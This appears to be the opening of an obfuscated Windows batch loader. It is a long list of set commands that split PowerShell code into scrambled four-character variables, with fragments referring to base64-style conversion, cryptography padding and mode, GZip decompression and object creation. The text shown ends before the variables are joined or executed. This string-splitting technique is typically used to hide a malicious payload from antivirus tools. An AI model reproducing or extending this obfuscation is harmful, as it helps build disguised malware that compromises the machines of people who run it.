@echo off
set "SbqjAcWSPv=n ''"
set "IbqabCAdqv=th('"
set "LAjrujsnNH=ew-O"
set "qilUAyxILJ=.GZi"
set "tIEvvwXqIm=]::("
set "JFmIqtFtuH=Conv"
set "ZpxuaaTdDD=]::N"
set "mYxfefLknA=k; }"
set "aaDxHdMJNK=jk.D"
set "EtSYafthfJ=stem"
set "OmNJglweXh=m(, "
set "ctlCfmUZkH=ehMH"
set "GzPUIDZnOl=.-16"
set "IAxWWnFFUB=.Cry"
set "XixCuHqPPk=[Sys"
set "aYPNluYdgC=lCjk"
set "DoejFNSjlH=F'[-"
set "AkLczDMtaR=eNi."
set "dRDycXGEfy=em.I"
set "fHwGLPhvze=Obje"
set "gndFeosUjj=; };"
set "ddGpcDPpGs=3); "
set "McbEntRGIB=ptog"
set "febacCKbcW=)))"
set "CaybDeGdTF=$rDB"
set "LhphpIOBLd=ddin"
set "nScxRmXiWq=zuZI"
set "SHgMAanlkC=s = "
set "RpkxpPRGuy=tsWi"
set "FblPKzSCTy= [st"
set "tZiDmlvEOM= if "
set "JuBlrGFSFy= = $"
set "UNBsMkPKAP=gMod"
set "JCXRqeGMPK=join"
set "SmbceSuGCz=.Key"
set "LyvBEcHPuV='gni"
set "QFRkxAaXhC=New-"
set "QZSHGdoUJj=n ''"
set "wIhFmVqEfU=106u"
set "tgyhrozeVh=gsYZ"
set "PFNLfSPFUO=::De"
set "WdIxgXochP=brea"
set "ROQaqqbZha=tem."
set "aysPODmnyN=();$"
set "wgbyJhbUlH=elCj"
set "MdDOesOLIH=yste"
set "JcaPfQpQbU='')("
set "BCVQMFFvYZ=[]] "
set "NKhlIGWmql=urit"
set "FrqBKGYiMJ='[-1"
set "sYGgvMmkmC=tem."
set "QxUDbpxaDr=rsRs"
set "LQlXhzeNRK=.Dis"
set "DbeHCtOtVi=eMVs"
set "sicdakzUMU=7;$V"
set "NhYCymxtrc=ni ="
set "tWzOwgqUKf=m.Re"
set "tmVqfgqfBO=.Mod"
set "bBgNqHNfVm=.Com"
set "VpkXTBnwtL=crsR"
set "qbcVYzSaSt=form"
